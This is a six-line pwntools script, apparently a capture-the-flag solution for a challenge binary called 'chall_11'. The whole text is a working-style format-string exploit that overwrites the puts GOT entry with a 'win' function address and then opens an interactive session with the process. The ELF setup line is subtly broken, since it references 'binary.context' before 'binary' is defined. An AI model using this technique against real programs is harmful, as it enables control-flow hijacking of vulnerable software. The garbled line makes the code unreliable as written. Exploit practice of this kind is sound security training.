from pwn import *
p=process("./chall_11")
binary=binary.context=ELF("./chall_11")
payload = fmtstr_payload(7,{binary.got.puts: binary.sym.win }, write_size='byte')
p.sendline(payload)
p.interactive()
